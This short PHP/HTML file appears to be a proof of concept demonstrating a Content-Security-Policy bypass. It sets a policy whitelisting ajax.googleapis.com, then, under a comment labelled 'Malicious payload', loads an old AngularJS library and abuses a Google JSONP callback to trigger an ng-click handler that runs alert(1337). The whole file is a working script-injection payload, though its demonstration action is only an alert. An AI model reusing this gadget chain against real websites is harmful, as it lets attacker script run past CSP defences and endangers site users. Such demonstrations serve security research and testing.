<?php
header("Content-Security-Policy: default-src 'self' ajax.googleapis.com");
?>
<html ng-app>
<head>

</head>
<body>


<!-- Malicious payload -->
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
<script async src=//ajax.googleapis.com/jsapi?callback=p.click>
</script>
<!-- -->

</body>
</html>